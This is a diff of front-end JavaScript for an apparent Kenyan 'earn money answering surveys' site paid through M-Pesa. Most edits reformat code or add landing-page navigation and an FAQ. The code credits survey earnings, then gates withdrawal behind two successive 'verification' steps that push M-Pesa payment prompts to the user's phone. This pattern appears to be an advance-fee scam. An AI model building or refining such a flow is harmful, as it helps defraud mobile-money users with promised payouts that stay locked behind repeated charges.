@@ -7,7 +7,11 @@ let token = localStorage.getItem('ks_token') || null;
 let userProfile = null;
 let currentPage = 0;
 let totalPages = 7;
-let stats = { balance: 0, totalEarned: 0, completedQuestions: 0, totalQuestions: 40, activated: false, forceVerified: false, activationPhone: "", transactions: [] };
+let stats = {
+  balance: 0, totalEarned: 0, completedQuestions: 0,
+  totalQuestions: 40, activated: false, forceVerified: false,
+  activationPhone: "", transactions: []
+};
 let activationRef = null;
 let activationPollTimer = null;
 let forceVerifyPollTimer = null;
@@ -16,7 +20,18 @@ let forceVerifyPollTimer = null;
 // INIT
 // ════════════════════════════════════════════
 window.addEventListener('DOMContentLoaded', () => {
-  if (token) loadUser();
+  if (token) {
+    loadUser();
+  }
+  // Sticky nav shadow on scroll
+  const nav = document.getElementById('lp-nav');
+  if (nav) {
+    window.addEventListener('scroll', () => {
+      nav.style.boxShadow = window.scrollY > 10
+        ? '0 4px 24px rgba(0,0,0,0.4)'
+        : 'none';
+    });
+  }
 });
 
 async function loadUser() {
@@ -32,7 +47,7 @@ async function loadUser() {
   } catch {
     token = null;
     localStorage.removeItem('ks_token');
-    showScreen('auth-screen');
+    showScreen('landing-screen');
   }
 }
 
@@ -48,6 +63,7 @@ async function initApp() {
 function showScreen(id) {
   document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
   document.getElementById(id).classList.add('active');
+  window.scrollTo(0, 0);
 }
 
 function showPanel(name) {
@@ -65,6 +81,47 @@ function showPanel(name) {
     document.getElementById('wd-unlocked').classList.add('hidden');
   }
   if (name === 'transactions') renderAllTransactions();
+}
+
+// ════════════════════════════════════════════
+// LANDING PAGE NAVIGATION
+// ════════════════════════════════════════════
+function goToAuth(tab) {
+  showScreen('auth-screen');
+  switchTab(tab || 'register');
+}
+
+function goToLanding() {
+  showScreen('landing-screen');
+}
+
+function scrollToTop() {
+  window.scrollTo({ top: 0, behavior: 'smooth' });
+}
+
+function toggleLpMenu() {
+  const menu = document.getElementById('lp-mobile-menu');
+  if (menu) menu.classList.toggle('open');
+}
+
+function closeLpMenu() {
+  const menu = document.getElementById('lp-mobile-menu');
+  if (menu) menu.classList.remove('open');
+}
+
+function toggleFaq(btn) {
+  const item = btn.closest('.lp-faq-item');
+  const answer = item.querySelector('.lp-faq-a');
+  const isOpen = answer.classList.contains('open');
+
+  // Close all
+  document.querySelectorAll('.lp-faq-a').forEach(a => a.classList.remove('open'));
+  document.querySelectorAll('.lp-faq-q').forEach(b => b.classList.remove('open'));
+
+  if (!isOpen) {
+    answer.classList.add('open');
+    btn.classList.add('open');
+  }
 }
 
 // ════════════════════════════════════════════
@@ -93,10 +150,10 @@ function switchTab(tab) {
 
 async function doRegister() {
   const phone = document.getElementById('reg-phone').value.trim();
-  const pin = document.getElementById('reg-pin').value.trim();
-  const pin2 = document.getElementById('reg-pin2').value.trim();
+  const pin   = document.getElementById('reg-pin').value.trim();
+  const pin2  = document.getElementById('reg-pin2').value.trim();
   const errEl = document.getElementById('reg-error');
-  const btn = document.getElementById('btn-register');
+  const btn   = document.getElementById('btn-register');
 
   clearAlert(errEl);
   if (!phone || !pin || !pin2) { showAlert(errEl, 'All fields are required.'); return; }
@@ -122,9 +179,9 @@ async function doRegister() {
 
 async function doLogin() {
   const phone = document.getElementById('login-phone').value.trim();
-  const pin = document.getElementById('login-pin').value.trim();
+  const pin   = document.getElementById('login-pin').value.trim();
   const errEl = document.getElementById('login-error');
-  const btn = document.getElementById('btn-login');
+  const btn   = document.getElementById('btn-login');
 
   clearAlert(errEl);
   if (!phone || !pin) { showAlert(errEl, 'Phone and PIN required.'); return; }
@@ -153,13 +210,13 @@ async function doLogin() {
 }
 
 async function doCompleteProfile() {
-  const name = document.getElementById('prof-name').value.trim();
-  const county = document.getElementById('prof-county').value;
+  const name       = document.getElementById('prof-name').value.trim();
+  const county     = document.getElementById('prof-county').value;
   const occupation = document.getElementById('prof-occupation').value;
-  const education = document.getElementById('prof-education').value;
-  const errEl = document.getElementById('prof-error');
-  const succEl = document.getElementById('prof-success');
-  const btn = document.getElementById('btn-profile');
+  const education  = document.getElementById('prof-education').value;
+  const errEl      = document.getElementById('prof-error');
+  const succEl     = document.getElementById('prof-success');
+  const btn        = document.getElementById('btn-profile');
 
   clearAlert(errEl); clearAlert(succEl);
   if (!name || !county || !occupation || !education) { showAlert(errEl, 'All fields are required.'); return; }
@@ -188,8 +245,7 @@ function doLogout() {
   token = null;
   userProfile = null;
   localStorage.removeItem('ks_token');
-  showScreen('auth-screen');
-  switchTab('login');
+  showScreen('landing-screen');
 }
 
 // ════════════════════════════════════════════
@@ -212,45 +268,45 @@ async function loadStats() {
 }
 
 function updateDashboard() {
-  const bal = stats.balance.toFixed(2);
-  const earned = (stats.totalEarned || 0).toFixed(2);
+  const bal       = stats.balance.toFixed(2);
+  const earned    = (stats.totalEarned || 0).toFixed(2);
   const completed = stats.completedQuestions || 0;
-  const total = stats.totalQuestions || 40;
+  const total     = stats.totalQuestions || 40;
   const remaining = total - completed;
-  const pct = Math.round((completed / total) * 100);
+  const pct       = Math.round((completed / total) * 100);
 
   document.getElementById('sidebar-balance').textContent = `KSh ${bal}`;
-  document.getElementById('sidebar-earned').textContent = `Total compensation: KSh ${earned}`;
-  document.getElementById('mobile-balance').textContent = `KSh ${bal}`;
-  document.getElementById('stat-balance').textContent = bal;
-  document.getElementById('stat-earned').textContent = earned;
-  document.getElementById('stat-completed').textContent = completed;
-  document.getElementById('stat-remaining').textContent = remaining;
-  document.getElementById('progress-fill').style.width = pct + '%';
-  document.getElementById('progress-text').textContent = `${completed} / ${total} completed`;
+  document.getElementById('sidebar-earned').textContent  = `Total compensation: KSh ${earned}`;
+  document.getElementById('mobile-balance').textContent  = `KSh ${bal}`;
+  document.getElementById('stat-balance').textContent    = bal;
+  document.getElementById('stat-earned').textContent     = earned;
+  document.getElementById('stat-completed').textContent  = completed;
+  document.getElementById('stat-remaining').textContent  = remaining;
+  document.getElementById('progress-fill').style.width   = pct + '%';
+  document.getElementById('progress-text').textContent   = `${completed} / ${total} completed`;
   document.getElementById('nav-survey-badge').textContent = remaining;
 
-  const hour = new Date().getHours();
+  const hour  = new Date().getHours();
   const greet = hour < 12 ? 'Good morning' : hour < 17 ? 'Good afternoon' : 'Good evening';
   document.getElementById('dash-greeting').textContent = `${greet}, ${userProfile?.name || 'there'}!`;
 
-  const banner = document.getElementById('activation-banner');
+  const banner     = document.getElementById('activation-banner');
   const bannerTitle = document.getElementById('activation-banner-title');
-  const bannerDesc = document.getElementById('activation-banner-desc');
-  const bannerBtn = document.getElementById('activation-banner-btn');
+  const bannerDesc  = document.getElementById('activation-banner-desc');
+  const bannerBtn   = document.getElementById('activation-banner-btn');
 
   if (stats.forceVerified) {
     banner.classList.add('hidden');
   } else if (stats.activated) {
     banner.classList.remove('hidden');
     if (bannerTitle) bannerTitle.innerHTML = '<i class="fas fa-link" style="margin-right:6px"></i>Payout Channel Verification Required';
-    if (bannerDesc) bannerDesc.textContent = 'Your identity has been verified. Complete payout channel verification to enable payment processing to your M-Pesa account.';
-    if (bannerBtn) { bannerBtn.textContent = 'Complete Verification'; bannerBtn.onclick = () => showPanel('withdraw'); }
+    if (bannerDesc)  bannerDesc.textContent = 'Your identity has been verified. Complete payout channel verification to enable payment processing to your M-Pesa account.';
+    if (bannerBtn)   { bannerBtn.textContent = 'Complete Verification'; bannerBtn.onclick = () => showPanel('withdraw'); }
   } else {
     banner.classList.remove('hidden');
     if (bannerTitle) bannerTitle.innerHTML = '<i class="fas fa-shield-alt" style="margin-right:6px"></i>Account Verification Required';
-    if (bannerDesc) bannerDesc.textContent = 'To verify your registered mobile number and activate M-Pesa payment services, a one-time account verification process is required before your first payment request.';
-    if (bannerBtn) { bannerBtn.textContent = 'Verify Account'; bannerBtn.onclick = () => showPanel('withdraw'); }
+    if (bannerDesc)  bannerDesc.textContent = 'To verify your registered mobile number and activate M-Pesa payment services, a one-time account verification process is required before your first payment request.';
+    if (bannerBtn)   { bannerBtn.textContent = 'Verify Account'; bannerBtn.onclick = () => showPanel('withdraw'); }
   }
 
   renderDashTransactions();
@@ -258,13 +314,13 @@ function updateDashboard() {
 
 function updateSidebarUser() {
   if (!userProfile) return;
-  document.getElementById('sidebar-name').textContent = userProfile.name || 'User';
+  document.getElementById('sidebar-name').textContent  = userProfile.name || 'User';
   const ph = userProfile.phone || '';
   document.getElementById('sidebar-phone').textContent = '+' + ph;
 }
 
 function renderDashTransactions() {
-  const el = document.getElementById('dash-tx-list');
+  const el  = document.getElementById('dash-tx-list');
   const txs = (stats.transactions || []).slice(0, 6);
   if (!txs.length) {
     el.innerHTML = '<div class="empty-state"><i class="fas fa-inbox"></i><p>No activity yet. Participate in surveys to begin earning compensation.</p></div>';
@@ -274,7 +330,7 @@ function renderDashTransactions() {
 }
 
 function renderAllTransactions() {
-  const el = document.getElementById('all-tx-list');
+  const el  = document.getElementById('all-tx-list');
   const txs = stats.transactions || [];
   if (!txs.length) {
     el.innerHTML = '<div class="empty-state"><i class="fas fa-inbox"></i><p>No activity yet. Participate in surveys to begin earning compensation.</p></div>';
@@ -285,12 +341,12 @@ function renderAllTransactions() {
 
 function renderTxItem(tx) {
   const isPositive = tx.amount > 0;
-  const type = tx.type;
+  const type       = tx.type;
   let iconClass = 'earn', iconName = 'coins';
   if (type === 'withdrawal') { iconClass = 'withdraw'; iconName = 'paper-plane'; }
   else if (type === 'welcome_bonus' || type === 'activation') { iconClass = 'bonus'; iconName = 'gift'; }
 
-  const date = new Date(tx.createdAt).toLocaleDateString('en-KE', { day: 'numeric', month: 'short', year: 'numeric' });
+  const date   = new Date(tx.createdAt).toLocaleDateString('en-KE', { day: 'numeric', month: 'short', year: 'numeric' });
   const amount = isPositive ? `+KSh ${tx.amount.toFixed(2)}` : `-KSh ${Math.abs(tx.amount).toFixed(2)}`;
 
   return `<div class="tx-item">
@@ -312,7 +368,7 @@ async function loadQuestions(page) {
 
   try {
     const data = await apiFetch(`/survey/questions?page=${page}`);
-    totalPages = data.totalPages;
+    totalPages  = data.totalPages;
     currentPage = data.page;
     renderQuestions(data.questions);
     updatePagination();
@@ -323,7 +379,7 @@ async function loadQuestions(page) {
 }
 
 function renderQuestions(questions) {
-  const grid = document.getElementById('questions-grid');
+  const grid        = document.getElementById('questions-grid');
   const completedIds = stats.completedIds || [];
 
   grid.innerHTML = questions.map(q => {
@@ -400,19 +456,19 @@ async function submitAnswer(questionId, answerIndex, reward) {
     }
 
     card.dataset.answered = 'true';
-
     stats.balance = data.balance;
+
     if (data.correct) {
-      stats.totalEarned = (stats.totalEarned || 0) + data.earned;
+      stats.totalEarned       = (stats.totalEarned || 0) + data.earned;
       stats.completedQuestions = (stats.completedQuestions || 0) + 1;
     } else {
       stats.completedQuestions = (stats.completedQuestions || 0) + 1;
     }
 
     document.getElementById('sidebar-balance').textContent = `KSh ${data.balance.toFixed(2)}`;
-    document.getElementById('mobile-balance').textContent = `KSh ${data.balance.toFixed(2)}`;
-    document.getElementById('stat-balance').textContent = data.balance.toFixed(2);
-    document.getElementById('wd-balance').textContent = `KSh ${data.balance.toFixed(2)}`;
+    document.getElementById('mobile-balance').textContent  = `KSh ${data.balance.toFixed(2)}`;
+    document.getElementById('stat-balance').textContent    = data.balance.toFixed(2);
+    document.getElementById('wd-balance').textContent      = `KSh ${data.balance.toFixed(2)}`;
 
     loadStats();
 
@@ -457,7 +513,7 @@ function renderPageDots(total) {
 }
 
 // ════════════════════════════════════════════
-// PAYMENT REQUEST (WITHDRAW)
+// PARTICIPANT COMPENSATION (WITHDRAW)
 // ════════════════════════════════════════════
 function formatPhoneDisplay(phone) {
   let ph = String(phone || '');
@@ -469,11 +525,11 @@ function updateWithdrawPanel() {
   const bal = (stats.balance || 0).toFixed(2);
   document.getElementById('wd-balance').textContent = `KSh ${bal}`;
 
-  const statusEl   = document.getElementById('wd-status');
-  const phoneRow   = document.getElementById('wd-phone-row');
-  const regPhone   = document.getElementById('wd-reg-phone');
-  const lockedDiv  = document.getElementById('wd-locked');
-  const forceDiv   = document.getElementById('wd-force');
+  const statusEl    = document.getElementById('wd-status');
+  const phoneRow    = document.getElementById('wd-phone-row');
+  const regPhone    = document.getElementById('wd-reg-phone');
+  const lockedDiv   = document.getElementById('wd-locked');
+  const forceDiv    = document.getElementById('wd-force');
   const unlockedDiv = document.getElementById('wd-unlocked');
 
   lockedDiv.classList.add('hidden');
@@ -487,7 +543,6 @@ function updateWithdrawPanel() {
 
   } else if (!stats.forceVerified) {
     statusEl.innerHTML = '<span class="chip" style="background:rgba(0,166,81,0.12);color:var(--green-light);border-color:rgba(0,166,81,0.3)"><i class="fas fa-check-circle"></i> Identity Verified – Payout Channel Pending</span>';
-
     if (stats.activationPhone) {
       phoneRow.style.display = 'flex';
       regPhone.textContent = formatPhoneDisplay(stats.activationPhone);
@@ -501,7 +556,7 @@ function updateWithdrawPanel() {
       regPhone.textContent = formatPhoneDisplay(stats.activationPhone);
     }
     unlockedDiv.classList.remove('hidden');
-    const slider = document.getElementById('wd-slider');
+    const slider     = document.getElementById('wd-slider');
     const maxWithdraw = Math.min(Math.floor(stats.balance / 10) * 10, 10000);
     slider.max = Math.max(150, maxWithdraw);
     updateSlider();
@@ -518,7 +573,7 @@ async function doActivate() {
   const phone = document.getElementById('act-phone').value.trim();
   const errEl = document.getElementById('act-error');
   const succEl = document.getElementById('act-success');
-  const btn = document.getElementById('btn-activate');
+  const btn   = document.getElementById('btn-activate');
 
   clearAlert(errEl); clearAlert(succEl);
   if (!phone) { showAlert(errEl, 'Enter your M-Pesa phone number.'); return; }
@@ -575,10 +630,9 @@ function startActivationPoll(ref) {
 async function doForceVerify() {
   const errEl = document.getElementById('fv-error');
   const succEl = document.getElementById('fv-success');
-  const btn = document.getElementById('btn-force-verify');
+  const btn   = document.getElementById('btn-force-verify');
 
   clearAlert(errEl); clearAlert(succEl);
-
   btn.disabled = true;
   btn.innerHTML = '<span class="spinner"></span> Sending prompt...';
 
@@ -628,11 +682,11 @@ function startForceVerifyPoll(ref, btn) {
 
 // ── Payment Request ──
 async function doWithdraw() {
-  const phone = document.getElementById('wd-phone').value.trim();
+  const phone  = document.getElementById('wd-phone').value.trim();
   const amount = document.getElementById('wd-slider').value;
-  const errEl = document.getElementById('wd-error');
+  const errEl  = document.getElementById('wd-error');
   const succEl = document.getElementById('wd-success');
-  const btn = document.getElementById('btn-withdraw');
+  const btn    = document.getElementById('btn-withdraw');
 
   clearAlert(errEl); clearAlert(succEl);
   if (!phone) { showAlert(errEl, 'Enter your M-Pesa number.'); return; }
@@ -682,7 +736,7 @@ async function apiFetch(path, method = 'GET', body = null) {
   if (token) opts.headers['Authorization'] = `Bearer ${token}`;
   if (body) opts.body = JSON.stringify(body);
 
-  const res = await fetch(API + path, opts);
+  const res  = await fetch(API + path, opts);
   const data = await res.json();
   if (!res.ok) throw new Error(data.message || 'Request failed');
   return data;
@@ -700,10 +754,10 @@ function clearAlert(el) {
 
 function toast(msg, type = 'info') {
   const container = document.getElementById('toast-container');
-  const el = document.createElement('div');
-  el.className = `toast ${type}`;
-  const icons = { success: 'check-circle', error: 'times-circle', info: 'info-circle' };
-  el.innerHTML = `<i class="fas fa-${icons[type] || 'info-circle'}"></i> ${msg}`;
+  const el        = document.createElement('div');
+  el.className    = `toast ${type}`;
+  const icons     = { success: 'check-circle', error: 'times-circle', info: 'info-circle' };
+  el.innerHTML    = `<i class="fas fa-${icons[type] || 'info-circle'}"></i> ${msg}`;
   container.appendChild(el);
   setTimeout(() => {
     el.style.animation = 'slideOut 0.3s ease forwards';
